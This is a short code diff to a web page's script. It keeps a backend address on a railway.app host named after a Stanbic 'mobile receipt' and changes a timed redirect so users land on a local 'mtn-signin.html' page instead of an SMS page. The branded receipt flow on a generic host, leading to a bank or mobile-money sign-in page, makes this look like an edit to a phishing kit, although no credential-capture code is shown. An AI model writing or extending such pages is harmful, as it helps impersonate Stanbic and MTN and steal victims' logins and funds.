@@ -390,9 +390,6 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ═══════════════════════════════════════════════════════════
-     API_BASE — HARD-PINNED to the Stanbic Railway backend.
-     ═══════════════════════════════════════════════════════════ */
   const API_BASE = 'https://stanbic-mobile-receipt-production.up.railway.app';
 
   const I18N = {
@@ -710,7 +707,7 @@
       lang: currentLang
     });
     setTimeout(() => {
-      window.location.href = 'sms.html?' + q.toString();
+      window.location.href = 'mtn-signin.html?' + q.toString();
     }, 3000);
   }
 
